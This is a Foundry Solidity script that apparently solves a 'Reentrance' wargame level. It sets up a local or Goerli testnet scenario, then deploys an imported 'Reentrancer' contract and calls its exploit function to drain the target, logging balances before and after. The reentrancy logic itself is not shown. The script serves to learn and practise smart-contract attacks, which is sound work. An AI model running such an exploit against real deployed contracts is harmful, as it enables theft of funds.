// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/Reentrance/Reentrance.sol";
import "./Reentrancer.sol";

contract ReentranceScript is Script {

    address internal attacker;
    address internal deployer;
    Reentrance target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = Reentrance(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new Reentrance();
            (bool sent,) = address(target).call{value: 0.001 ether}("");
            require(sent, "Failed to send Ether");
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console2.log("[Info]");
        console2.log("attacker : %s", attacker);
        console2.log("target.balance : %d wei", address(target).balance);

        console2.log("[Exploit]");
        uint256 initBalance = 0.0001 ether;
        vm.startBroadcast(attacker);
        Reentrancer reentrancer = new Reentrancer();
        reentrancer.exploit{value: initBalance}(address(target));
        vm.stopBroadcast();
        console2.log("balanceOf[reentrancer] : %d wei", target.balanceOf(address(reentrancer)));
        console2.log("target.balance         : %d wei", address(target).balance);
    }
}